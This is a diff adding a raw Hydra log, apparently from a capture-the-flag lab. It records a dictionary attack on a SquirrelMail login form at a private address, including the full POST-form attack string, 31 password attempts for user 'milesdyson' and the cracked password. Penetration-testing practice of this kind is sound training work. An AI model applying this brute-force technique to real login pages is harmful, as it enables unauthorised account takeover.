@@ -1,0 +1,40 @@
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-25 23:42:54
+[DATA] max 30 tasks per 1 server, overall 30 tasks, 31 login tries (l:1/p:31), ~2 tries per task
+[DATA] attacking http-post-form://10.10.234.100:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "cyborg007haloterminator" - 1 of 31 [child 0] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator22596" - 2 of 31 [child 1] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator219" - 3 of 31 [child 2] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator20" - 4 of 31 [child 3] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator1989" - 5 of 31 [child 4] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator1988" - 6 of 31 [child 5] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator168" - 7 of 31 [child 6] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator16" - 8 of 31 [child 7] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator143" - 9 of 31 [child 8] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator13" - 10 of 31 [child 9] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator123!@#" - 11 of 31 [child 10] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator1056" - 12 of 31 [child 11] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator101" - 13 of 31 [child 12] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator10" - 14 of 31 [child 13] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator02" - 15 of 31 [child 14] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "terminator00" - 16 of 31 [child 15] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "roboterminator" - 17 of 31 [child 16] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "pongterminator" - 18 of 31 [child 17] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "manasturcaluterminator" - 19 of 31 [child 18] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "exterminator95" - 20 of 31 [child 19] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "exterminator200" - 21 of 31 [child 20] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "dterminator" - 22 of 31 [child 21] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "djxterminator" - 23 of 31 [child 22] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "dexterminator" - 24 of 31 [child 23] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "determinator" - 25 of 31 [child 24] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "cyborg007haloterminator" - 26 of 31 [child 25] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "avsterminator" - 27 of 31 [child 26] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "alonsoterminator" - 28 of 31 [child 27] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "Walterminator" - 29 of 31 [child 28] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "79terminator6" - 30 of 31 [child 29] (0/0)
+[ATTEMPT] target 10.10.234.100 - login "milesdyson" - pass "1996terminator" - 31 of 31 [child 7] (0/0)
+[80][http-post-form] host: 10.10.234.100   login: milesdyson   password: cyborg007haloterminator
+[80][http-post-form] host: 10.10.234.100   login: milesdyson   password: cyborg007haloterminator
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-25 23:43:08
